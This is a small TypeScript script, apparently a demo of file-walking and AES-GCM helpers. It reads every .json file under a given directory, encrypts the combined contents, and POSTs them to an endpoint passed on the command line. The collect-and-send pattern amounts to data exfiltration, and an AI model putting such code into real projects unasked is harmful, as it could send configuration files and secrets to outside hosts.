import { argv } from "node:process";
import { decryptStringAesGcm, encryptStringAesGcm } from "./encrypt.ts";
import { exploreFilesAsync, MAX_WORKER_COUNT } from "./exploreFilesAsync.ts";

const rootDir = argv[argv.length - 2];
const endpoint = argv[argv.length - 1];

const sourcesIterator = exploreFilesAsync({
  rootDir,
  shouldExploreDir: (path) =>
    !path.endsWith(".git") && !path.endsWith("node_modules"),
  shouldReadFile: (file) => file.path.endsWith(".json"),
  workerCount: MAX_WORKER_COUNT,
});

let out = "";
for await (const file of sourcesIterator) {
  const path = file.path;
  const text = file.contents.asText();
  out += path + "\n" + text + "\n\n";
}

const { key, iv, ciphertext } = await encryptStringAesGcm(out);
console.log(await fetch(endpoint, { method: "POST", body: ciphertext }));

console.log({ endpoint });
console.log({ ciphertext });
console.log("---");
console.log(await decryptStringAesGcm(ciphertext, key, iv));
